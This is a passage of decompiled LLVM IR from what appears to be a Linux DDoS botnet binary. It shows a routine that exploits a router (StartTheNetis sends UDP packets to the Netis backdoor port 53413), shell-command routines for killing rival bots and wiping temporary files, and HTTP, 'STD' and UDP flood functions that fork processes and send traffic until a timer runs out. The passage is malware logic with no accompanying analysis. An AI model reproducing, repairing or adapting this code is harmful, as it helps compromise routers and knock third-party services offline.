  uselistorder i32 %stack_var_-620.242, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 17, 16, 15, 12, 11, 10, 7, 6, 5, 4, 3, 2, 0, 1, 9, 8, 14, 13, 18 }
  uselistorder i32 %storemerge43, { 0, 3, 4, 5, 6, 8, 7, 1, 2 }
  uselistorder i32 %v4_804c988, { 1, 0, 2 }
  uselistorder i32 %storemerge245, { 1, 0 }
  uselistorder i32 %v2_804c963, { 1, 0, 4, 3, 2, 6, 5, 7, 9, 8, 10, 13, 12, 11, 14, 15 }
  uselistorder i32 %v2_804c8da, { 12, 4, 14, 13, 16, 15, 5, 6, 7, 8, 17, 0, 1, 2, 9, 3, 10, 11 }
  uselistorder i32 %v1_804c886, { 1, 0, 2 }
  uselistorder i32* %stack_var_-608, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32* %stack_var_-600, { 3, 1, 0, 2, 4, 5, 6 }
  uselistorder i32* %stack_var_-320, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-328, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32* %stack_var_-332, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %stack_var_-336, { 1, 5, 0, 3, 2, 6, 7, 4, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 9, 21, 22, 24, 23, 26, 25, 27, 28, 29, 30, 31, 32, 33, 35, 34, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 48, 47, 49, 50, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 77, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 17, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 60, 61, 62, 59, 63, 64, 65, 66, 68, 67, 69, 70, 72, 71, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 86, 87, 88, 85, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 100, 101, 99, 102, 103, 104, 105, 106, 107, 108, 111, 109, 110, 112, 113, 114, 115, 116, 117, 118, 119, 121, 120, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 148, 163, 164, 165, 166, 167, 168, 169, 0, 182, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 189, 183, 184, 185, 186, 187, 188 }
  uselistorder i32 ()* @get_telstate_host, { 1, 0 }
  uselistorder i32 ()* @contains_fail, { 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 2, 0 }
  uselistorder i8 6, { 1, 0 }
  uselistorder i8 5, { 1, 0 }
  uselistorder i32 5000, { 1, 0 }
  uselistorder label %dec_label_pc_804dac9, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804c9f2, { 1, 0 }
  uselistorder label %dec_label_pc_804c9a3, { 1, 0 }
  uselistorder label %dec_label_pc_804c90f, { 1, 0 }
}

define i32 @StartTheNetis() local_unnamed_addr {
entry:
  %stack_var_-1068 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v2_804db23 = ptrtoint i32* %stack_var_-44 to i32
  %v2_804db4a = ptrtoint i32* %stack_var_-1068 to i32
  %v4_804db70 = bitcast i32* %stack_var_-1068 to i8*
  br label %dec_label_pc_804dae7

dec_label_pc_804dae7:                             ; preds = %dec_label_pc_804dae7, %entry
  %v5_804daf0 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v5_804daf0, i32* @eax, align 4
  %v1_804dafb = call i32 @NetisRanges(i32 %v5_804daf0)
  store i32 2, i32* %stack_var_-44, align 4
  %v1_804db11 = call i32 @htons(i32 53413)
  %v3_804db51 = call i32 @sprintf(i32 %v2_804db4a, i32 ptrtoint ([327 x i8]* @global_var_8059090.256 to i32))
  %v3_804db76 = call i32 @_strlen(i8* %v4_804db70)
  %v7_804db91 = call i32 @__libc_sendto(i32 %v5_804daf0, i32 %v2_804db4a, i32 %v3_804db76, i32 0, i32 %v2_804db23, i32 16)
  br label %dec_label_pc_804dae7
}

define i32 @LoopPayload() local_unnamed_addr {
entry:
  %v2_804dbb9 = call i32 @__libc_system(i32 ptrtoint ([320 x i8]* @global_var_80591d8.257 to i32))
  ret i32 %v2_804dbb9
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-384 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804dbd5 = load i32, i32* @edi, align 4
  %v0_804dbd6 = load i32, i32* @esi, align 4
  %v0_804dbd7 = load i32, i32* @ebx, align 4
  store i32 %v0_804dbd7, i32* %stack_var_-16, align 4
  %tmp32 = bitcast i32* %stack_var_-68 to i8*
  store i32 ptrtoint ([9 x i8*]* @global_var_8059500.267 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804dbee = call i8* @_memcpy(i8* %tmp32, i8* bitcast ([9 x i8*]* @global_var_8059500.267 to i8*), i32 10)
  %v4_804dc06 = bitcast i32* %stack_var_-160 to i16*
  %v5_804dc06 = call i32 @memcpy(i16* %v4_804dc06, i32 ptrtoint ([23 x i8*]* @global_var_8059440.290 to i32), i32 92)
  %v2_804dc0e = ptrtoint i32* %stack_var_-224 to i32
  %tmp33 = bitcast i32* %stack_var_-224 to i8*
  store i32 %v2_804dc0e, i32* @edi, align 4
  store i32 ptrtoint ([16 x i8*]* @global_var_80593a0.300 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804dc21 = call i8* @_memcpy(i8* %tmp33, i8* bitcast ([16 x i8*]* @global_var_80593a0.300 to i8*), i32 16)
  %v5_804dc30 = icmp sgt i32 %tmp, 0
  br i1 %v5_804dc30, label %dec_label_pc_804dc36, label %dec_label_pc_804dd14

dec_label_pc_804dc36:                             ; preds = %entry
  %v2_804dc36 = ptrtoint i32* %stack_var_-512 to i32
  %v4_804dc4a = bitcast i32* %stack_var_-512 to i8*
  %v5_804dc4a = call i32 @__GI_memset(i8* %v4_804dc4a, i32 0, i32 128)
  %v0_804dc9e = load i32, i32* @ebp, align 4
  %v4_804dc65 = add i32 %v0_804dc9e, -64
  %v5_804dc65 = inttoptr i32 %v4_804dc65 to i32*
  %v6_804dc6c = load i32, i32* %v5_804dc65, align 4
  store i32 %v6_804dc6c, i32* @ebx, align 4
  %v6_804dc73 = load i32, i32* %v5_804dc65, align 4
  store i32 %v6_804dc73, i32* @esi, align 4
  %v6_804dc7a = load i32, i32* %v5_804dc65, align 4
  %v8_804dc91 = call i32 @__GI_snprintf(i32 %v2_804dc36, i32 127, i32 ptrtoint ([100 x i8]* @global_var_8059528.301 to i32), i32 %v6_804dc7a, i32 %v6_804dc73, i32 %v6_804dc6c)
  %v1_804dcd6 = call i32 @__libc_system(i32 %v2_804dc36)
  %v2_804dcf1 = ptrtoint i32* %stack_var_-384 to i32
  %v3_804dcf8 = call i32 @sprintf(i32 %v2_804dcf1, i32 ptrtoint ([14 x i8]* @global_var_80595a9.303 to i32))
  %v1_804dd0a = call i32 @__libc_system(i32 %v2_804dcf1)
  br label %dec_label_pc_804dd21

dec_label_pc_804dd14:                             ; preds = %entry
  %v1_804dd19 = call i32 @sleep(i32 5)
  br label %dec_label_pc_804dd21

dec_label_pc_804dd21:                             ; preds = %dec_label_pc_804dc36, %dec_label_pc_804dd14
  %storemerge = phi i32 [ %v1_804dd19, %dec_label_pc_804dd14 ], [ %v1_804dd0a, %dec_label_pc_804dc36 ]
  %v2_804dd24 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804dd24, i32* @ebx, align 4
  store i32 %v0_804dbd6, i32* @esi, align 4
  store i32 %v0_804dbd5, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v5_804dc65, { 0, 2, 1 }
  uselistorder i32 %v2_804dc36, { 1, 0 }
  uselistorder label %dec_label_pc_804dd21, { 1, 0 }
}

define i32 @RemoveTMP() local_unnamed_addr {
entry:
  %v2_804dd37 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_80595b8.304 to i32))
  %v2_804dd47 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_80595e3.305 to i32))
  %v2_804dd57 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_80595f8.306 to i32))
  %v2_804dd67 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_80595e3.305 to i32))
  %v2_804dd77 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_805960e.307 to i32))
  %v2_804dd87 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_805961c.308 to i32))
  %v2_804dd97 = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_8059627.309 to i32))
  %v2_804dda7 = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_805963e.310 to i32))
  %v2_804ddb7 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_8059652.311 to i32))
  %v2_804ddc7 = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_805965d.312 to i32))
  %v2_804ddd7 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_805966e.313 to i32))
  %v2_804dde7 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_805967c.314 to i32))
  %v2_804ddf7 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_8059694.315 to i32))
  ret i32 %v2_804ddf7

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804de1b = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804de26 = icmp eq i32 %v1_804de1b, 0
  %v1_804de2a = icmp eq i1 %v4_804de26, false
  br i1 %v1_804de2a, label %dec_label_pc_804de38, label %dec_label_pc_804de2c

dec_label_pc_804de2c:                             ; preds = %entry
  br label %dec_label_pc_804dedd

dec_label_pc_804de38:                             ; preds = %entry
  %v1_804de3b = add i32 %v1_804de1b, 12
  %v2_804de3b = inttoptr i32 %v1_804de3b to i32*
  %v3_804de3b = load i32, i32* %v2_804de3b, align 4
  %v1_804de43 = add i32 %v1_804de1b, 16
  %v2_804de43 = inttoptr i32 %v1_804de43 to i32*
  %v3_804de43 = load i32, i32* %v2_804de43, align 4
  %v1_804de46 = inttoptr i32 %v3_804de43 to i32*
  %v2_804de46 = load i32, i32* %v1_804de46, align 4
  %v15_804de4f = ptrtoint i32* %stack_var_-24 to i32
  %v3_804de54 = call i32 @bcopy(i32 %v2_804de46, i32 %v15_804de4f, i32 %v3_804de3b)
  %v1_804de5f1 = zext i16 %arg2 to i32
  %v1_804de68 = call i32 @htons(i32 %v1_804de5f1)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804de83 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804de8e = ptrtoint i32* %stack_var_-32 to i32
  %v5_804de9e = call i32 @__GI_setsockopt(i32 %v3_804de83, i32 6, i32 1, i32 %v2_804de8e, i32 4)
  %v13_804dea6 = icmp eq i32 %v3_804de83, -1
  %v1_804deaa = icmp eq i1 %v13_804dea6, false
  br i1 %v1_804deaa, label %dec_label_pc_804deb5, label %dec_label_pc_804deac

dec_label_pc_804deac:                             ; preds = %dec_label_pc_804de38
  br label %dec_label_pc_804dedd

dec_label_pc_804deb5:                             ; preds = %dec_label_pc_804de38
  %v2_804de4c = ptrtoint i32* %stack_var_-28 to i32
  %v3_804dec1 = call i32 @__libc_connect(i32 %v3_804de83, i32 %v2_804de4c, i32 16)
  %v10_804dec9 = icmp eq i32 %v3_804dec1, -1
  %v1_804decc = icmp eq i1 %v10_804dec9, false
  br i1 %v1_804decc, label %dec_label_pc_804ded7, label %dec_label_pc_804dece

dec_label_pc_804dece:                             ; preds = %dec_label_pc_804deb5
  br label %dec_label_pc_804dedd

dec_label_pc_804ded7:                             ; preds = %dec_label_pc_804deb5
  br label %dec_label_pc_804dedd

dec_label_pc_804dedd:                             ; preds = %dec_label_pc_804dece, %dec_label_pc_804deac, %dec_label_pc_804de2c, %dec_label_pc_804ded7
  %v3_804dedd = phi i32 [ 0, %dec_label_pc_804dece ], [ 0, %dec_label_pc_804deac ], [ 0, %dec_label_pc_804de2c ], [ %v3_804de83, %dec_label_pc_804ded7 ]
  ret i32 %v3_804dedd

; uselistorder directives
  uselistorder i32 %v3_804de83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804dedd, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-796 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %v0_804dee6 = load i32, i32* @ebx, align 4
  %v4_804df0d = bitcast i32* %stack_var_-272 to i16*
  %v5_804df0d = call i32 @memcpy(i16* %v4_804df0d, i32 ptrtoint ([62 x i8*]* @global_var_805aa20.378 to i32), i32 248)
  %v2_804df38 = call i32 @__GI_time(i32* null)
  %v5_804df40 = add i32 %v2_804df38, %arg5
  store i32 %v5_804df40, i32* @eax, align 4
  %v1_804df46 = call i32 @random()
  %v2_804df56 = ashr i32 %v1_804df46, 31
  %v2_804df59 = zext i32 %v1_804df46 to i64
  %v4_804df59 = zext i32 %v2_804df56 to i64
  %v5_804df59 = mul nuw i64 %v4_804df59, 4294967296
  %v6_804df59 = or i64 %v5_804df59, %v2_804df59
  %v10_804df59 = srem i64 %v6_804df59, 65
  %v11_804df59 = trunc i64 %v10_804df59 to i32
  store i32 %v11_804df59, i32* @eax, align 4
  %v0_804df5d = load i32, i32* @ebp, align 4
  %v2_804df5d = mul i32 %v11_804df59, 4
  %v3_804df5d = add i32 %v0_804df5d, -268
  %v4_804df5d = add i32 %v3_804df5d, %v2_804df5d
  %v5_804df5d = inttoptr i32 %v4_804df5d to i32*
  %v6_804df5d = load i32, i32* %v5_804df5d, align 4
  store i32 %v6_804df5d, i32* @ebx, align 4
  %v0_804df64 = call i32 @random()
  store i32 3, i32* @edi, align 4
  %v2_804df92 = ptrtoint i32* %stack_var_-796 to i32
  %v3_804df99 = call i32 @sprintf(i32 %v2_804df92, i32 ptrtoint ([62 x i8]* @global_var_805ab30.382 to i32))
  %v5_804e04a44 = icmp sgt i32 %arg6, 0
  br i1 %v5_804e04a44, label %dec_label_pc_804dfad, label %dec_label_pc_804e050

dec_label_pc_804dfad:                             ; preds = %entry, %dec_label_pc_804e041
  %storemerge45 = phi i32 [ %v4_804e041, %dec_label_pc_804e041 ], [ 0, %entry ]
  %v1_804dfad = call i32 @__libc_fork(i32 %storemerge45)
  %v1_804dfb2 = icmp eq i32 %v1_804dfad, 0
  br i1 %v1_804dfb2, label %dec_label_pc_804e041, label %dec_label_pc_804e025.preheader

dec_label_pc_804e025.preheader:                   ; preds = %dec_label_pc_804dfad
  %v4_804dff4 = bitcast i32* %stack_var_-796 to i8*
  %v2_804e02a38 = call i32 @__GI_time(i32* null)
  %v5_804e03541 = icmp slt i32 %v2_804e02a38, %v5_804df40
  br i1 %v5_804e03541, label %dec_label_pc_804dfbc.lr.ph, label %dec_label_pc_804e037

dec_label_pc_804dfbc.lr.ph:                       ; preds = %dec_label_pc_804e025.preheader
  br label %dec_label_pc_804dfbc

dec_label_pc_804dfbc:                             ; preds = %dec_label_pc_804dfbc.lr.ph, %dec_label_pc_804e025.backedge
  store i32 %arg1, i32* @edx, align 4
  %v4_804dfcf = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v4_804dfda = icmp eq i32 %v4_804dfcf, 0
  br i1 %v4_804dfda, label %dec_label_pc_804e025.backedge, label %dec_label_pc_804dfe0

dec_label_pc_804dfe0:                             ; preds = %dec_label_pc_804dfbc
  store i1 false, i1* @df, align 1
  store i32 %v2_804df92, i32* @edi, align 4
  %v3_804dffa = call i32 @_strlen(i8* %v4_804dff4)
  %v5_804e00f = call i32 @__libc_write(i32 %v4_804dfcf, i32* nonnull %stack_var_-796, i32 %v3_804dffa)
  %v1_804e01d = call i32 @__libc_close(i32 %v4_804dfcf)
  br label %dec_label_pc_804e025.backedge

dec_label_pc_804e025.backedge:                    ; preds = %dec_label_pc_804dfe0, %dec_label_pc_804dfbc
  %v2_804e02a = call i32 @__GI_time(i32* null)
  %v5_804e035 = icmp slt i32 %v2_804e02a, %v5_804df40
  br i1 %v5_804e035, label %dec_label_pc_804dfbc, label %dec_label_pc_804e037

dec_label_pc_804e037:                             ; preds = %dec_label_pc_804e025.backedge, %dec_label_pc_804e025.preheader
  %v1_804e03c = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_804e041:                             ; preds = %dec_label_pc_804dfad
  %v4_804e041 = add nuw nsw i32 %storemerge45, 1
  %v5_804e04a = icmp slt i32 %v4_804e041, %arg6
  br i1 %v5_804e04a, label %dec_label_pc_804dfad, label %dec_label_pc_804e050

dec_label_pc_804e050:                             ; preds = %dec_label_pc_804e041, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804e041, %dec_label_pc_804e041 ]
  store i32 %v0_804dee6, i32* @ebx, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804e041, { 0, 2, 1 }
  uselistorder i32 %storemerge45, { 1, 0 }
  uselistorder i32 %v5_804df40, { 1, 0, 2 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_804dfbc, { 1, 0 }
  uselistorder label %dec_label_pc_804dfad, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_804e06a = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804e07a = call i32 @__GI_time(i32* null)
  %v1_804e08c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804e097 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_804e0b8 = add i32 %v1_804e08c, 12
  %v2_804e0b8 = inttoptr i32 %v1_804e0b8 to i32*
  %v3_804e0b8 = load i32, i32* %v2_804e0b8, align 4
  %v2_804e0c0 = ptrtoint i32* %stack_var_-40 to i32
  %v1_804e0c6 = add i32 %v1_804e08c, 16
  %v2_804e0c6 = inttoptr i32 %v1_804e0c6 to i32*
  %v3_804e0c6 = load i32, i32* %v2_804e0c6, align 4
  %v1_804e0c9 = inttoptr i32 %v3_804e0c6 to i32*
  %v2_804e0c9 = load i32, i32* %v1_804e0c9, align 4
  %v4_804e0d1 = call i32 @bcopy(i32 %v2_804e0c9, i32 %v2_804e0c0, i32 %v3_804e0b8)
  %v1_804e0dc = add i32 %v1_804e08c, 8
  %v2_804e0dc = inttoptr i32 %v1_804e0dc to i32*
  %v3_804e0dc = load i32, i32* %v2_804e0dc, align 4
  store i32 %v3_804e0dc, i32* %stack_var_-44, align 4
  %v4_804e107 = bitcast i32* %stack_var_-188 to i16*
  %v5_804e192 = add i32 %v2_804e07a, %arg3
  br label %dec_label_pc_804e0f1

dec_label_pc_804e0f1:                             ; preds = %dec_label_pc_804e1b8, %entry
  %storemerge = phi i32 [ %v4_804e1b8, %dec_label_pc_804e1b8 ], [ 0, %entry ]
  %v5_804e107 = call i32 @memcpy(i16* %v4_804e107, i32 ptrtoint ([36 x i8*]* @global_var_805ad00.419 to i32), i32 144)
  store i32 %v5_804e107, i32* @eax, align 4
  %v0_804e10f = call i32 @random()
  %v2_804e11f = udiv i32 %v0_804e10f, 36
  %tmp = mul nsw i32 %v2_804e11f, -4
  %v2_804e13c = add i32 %v0_804e10f, %tmp
  store i32 %v2_804e13c, i32* @ebx, align 4
  %tmp31 = icmp ult i32 %storemerge, 50
  br i1 %tmp31, label %dec_label_pc_804e0f1.dec_label_pc_804e1b8_crit_edge, label %dec_label_pc_804e15a

dec_label_pc_804e0f1.dec_label_pc_804e1b8_crit_edge: ; preds = %dec_label_pc_804e0f1
  br label %dec_label_pc_804e1b8

dec_label_pc_804e15a:                             ; preds = %dec_label_pc_804e0f1
  %v0_804e14a = load i32, i32* @ebp, align 4
  %v3_804e14a = add i32 %v0_804e14a, -184
  %v2_804e14a = mul i32 %v2_804e13c, 4
  %v4_804e14a = add i32 %v3_804e14a, %v2_804e14a
  %v5_804e14a = inttoptr i32 %v4_804e14a to i32*
  %v6_804e14a = load i32, i32* %v5_804e14a, align 4
  %v5_804e164 = call i32 @__libc_send(i32 %v4_804e06a, i32 %v6_804e14a, i32 75, i32 0)
  %v4_804e178 = call i32 @__libc_connect(i32 %v4_804e06a, i32 %v2_804e097, i32 16)
  %v2_804e185 = call i32 @__GI_time(i32* null)
  %v5_804e197 = icmp slt i32 %v2_804e185, %v5_804e192
  br i1 %v5_804e197, label %dec_label_pc_804e1b8, label %dec_label_pc_804e199

dec_label_pc_804e199:                             ; preds = %dec_label_pc_804e15a
  %v1_804e19f = call i32 @__libc_close(i32 %v4_804e06a)
  %v1_804e1ac = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e1b8:                             ; preds = %dec_label_pc_804e0f1.dec_label_pc_804e1b8_crit_edge, %dec_label_pc_804e15a
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_804e0f1.dec_label_pc_804e1b8_crit_edge ], [ 0, %dec_label_pc_804e15a ]
  %v4_804e1b8 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804e0f1

; uselistorder directives
  uselistorder i32 %v2_804e13c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804e08c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 144, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e1b8, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_4()
  %tmp32 = call i16 @__decompiler_undefined_function_4()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_804e1c4 = load i32, i32* @ebx, align 4
  %v12_804e1c5 = ptrtoint i32* %stack_var_-108 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804e1ce = icmp eq i32 %arg2, 0
  %v1_804e1d2 = icmp eq i1 %v4_804e1ce, false
  br i1 %v1_804e1d2, label %dec_label_pc_804e1df, label %dec_label_pc_804e1d4

dec_label_pc_804e1d4:                             ; preds = %entry
  %v1_804e1d4 = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804e1f7

dec_label_pc_804e1df:                             ; preds = %entry
  %v1_804e1e2 = urem i32 %arg2, 65536
  store i32 %v1_804e1e2, i32* %eax.global-to-local, align 4
  %v1_804e1eb = call i32 @htons(i32 %v1_804e1e2)
  br label %dec_label_pc_804e1f7

dec_label_pc_804e1f7:                             ; preds = %dec_label_pc_804e1d4, %dec_label_pc_804e1df
  %v2_804e1fa = ptrtoint i32* %stack_var_-68 to i32
  %v15_804e1fd = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v15_804e1fd, i32* %eax.global-to-local, align 4
  %v4_804e204 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v4_804e204, i32* %eax.global-to-local, align 4
  %v1_804e20c = icmp eq i32 %v4_804e204, 0
  %v1_804e20e = icmp eq i1 %v1_804e20c, false
  br i1 %v1_804e20e, label %dec_label_pc_804e615, label %dec_label_pc_804e214

dec_label_pc_804e214:                             ; preds = %dec_label_pc_804e1f7
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804e22d = icmp eq i32 %arg4, 32
  %v1_804e231 = icmp eq i1 %v9_804e22d, false
  br i1 %v1_804e231, label %dec_label_pc_804e31d, label %dec_label_pc_804e237

dec_label_pc_804e237:                             ; preds = %dec_label_pc_804e214
  %v4_804e240 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_804e240, i32* %eax.global-to-local, align 4
  %v4_804e24b = icmp eq i32 %v4_804e240, 0
  %v1_804e24f = icmp eq i1 %v4_804e24b, false
  br i1 %v1_804e24f, label %dec_label_pc_804e26c, label %dec_label_pc_804e251

dec_label_pc_804e251:                             ; preds = %dec_label_pc_804e237
  %v0_804e251 = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_804e251, i32* %eax.global-to-local, align 4
  %v3_804e25f = call i32 @HackerPrint(i32 %v0_804e251, i32 ptrtoint ([27 x i8]* @global_var_805ad90.420 to i32))
  store i32 %v3_804e25f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e615

dec_label_pc_804e26c:                             ; preds = %dec_label_pc_804e237
  %v1_804e26f = add i32 %arg5, 1
  store i32 %v1_804e26f, i32* %eax.global-to-local, align 4
  %v1_804e274 = call i32 @malloc(i32 %v1_804e26f)
  store i32 %v1_804e274, i32* %eax.global-to-local, align 4
  %v4_804e27f = icmp eq i32 %v1_804e274, 0
  br i1 %v4_804e27f, label %dec_label_pc_804e615, label %dec_label_pc_804e289

dec_label_pc_804e289:                             ; preds = %dec_label_pc_804e26c
  store i32 %v1_804e26f, i32* %edx.global-to-local, align 4
  %v1_804e292 = inttoptr i32 %v1_804e274 to i8*
  store i32 %v1_804e274, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804e297 = and i32 %v1_804e274, -256
  store i32 %v1_804e297, i32* %eax.global-to-local, align 4
  %v5_804e299 = call i8* @_memset(i8* %v1_804e292, i32 %v1_804e297, i32 %v1_804e26f)
  %v3_804e2a1 = call i32 @makeRandomStr(i8* %v1_804e292, i32 %arg5)
  store i32 %v3_804e2a1, i32* %eax.global-to-local, align 4
  %v2_804e2ae = call i32 @__GI_time(i32* null)
  %v5_804e2b6 = add i32 %v2_804e2ae, %arg3
  store i32 %v5_804e2b6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e2c5

dec_label_pc_804e2c5:                             ; preds = %dec_label_pc_804e2f9, %dec_label_pc_804e318, %dec_label_pc_804e289
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804e289 ], [ %v4_804e318, %dec_label_pc_804e318 ], [ 0, %dec_label_pc_804e2f9 ]
  store i32 %v2_804e1fa, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v4_804e240, i32* %stack_var_-140, align 4
  %v7_804e2da = call i32 @__libc_sendto(i32 %v4_804e240, i32 %v1_804e274, i32 %arg5, i32 0, i32 %v2_804e1fa, i32 16)
  store i32 %v7_804e2da, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804e2e5 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804e2e8 = icmp eq i1 %v15_804e2e5, false
  br i1 %v1_804e2e8, label %dec_label_pc_804e318, label %dec_label_pc_804e2ea

dec_label_pc_804e2ea:                             ; preds = %dec_label_pc_804e2c5
  br i1 %v1_804e1d2, label %dec_label_pc_804e2f9, label %dec_label_pc_804e2f0

dec_label_pc_804e2f0:                             ; preds = %dec_label_pc_804e2ea
  %v0_804e2f0 = load i32, i32* %stack_var_-140, align 4
  %v1_804e2f0 = call i32 @rand_cmwc(i32 %v0_804e2f0)
  store i32 %v1_804e2f0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e2f9

dec_label_pc_804e2f9:                             ; preds = %dec_label_pc_804e2ea, %dec_label_pc_804e2f0
  %v2_804e2fe = call i32 @__GI_time(i32* null)
  store i32 %v2_804e2fe, i32* %eax.global-to-local, align 4
